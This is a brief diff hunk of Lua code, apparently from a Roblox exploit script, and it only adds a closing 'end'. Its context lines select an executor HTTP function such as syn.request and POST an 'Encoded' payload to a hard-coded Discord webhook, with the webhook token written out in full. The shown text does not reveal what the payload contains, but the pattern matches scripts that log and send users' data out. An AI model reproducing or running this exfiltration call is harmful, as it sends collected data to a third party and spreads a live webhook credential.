@@ -71,3 +71,4 @@ local Request = http_request or request or HttpPost or syn.request
 local Final = {Url = "https://discord.com/api/webhooks/1329954213811191913/gKQDWRFNoJjl2wIq6Ra8VazUAIx85EnKfTEXTwHa0e4gMuou3va-9hg0J53tFP_RnkrT", Body = Encoded, Method = "POST", Headers = Headers}
 Request(Final)
   end
+end
